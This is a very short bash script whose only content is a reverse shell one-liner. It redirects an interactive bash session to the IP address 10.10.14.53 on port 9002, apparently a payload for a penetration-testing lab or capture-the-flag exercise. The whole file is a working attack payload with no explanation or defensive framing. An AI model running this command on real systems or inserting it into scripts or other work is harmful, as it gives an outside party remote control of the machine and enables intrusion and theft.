#!/bin/bash

bash -i >& /dev/tcp/10.10.14.53/9002 0>&1
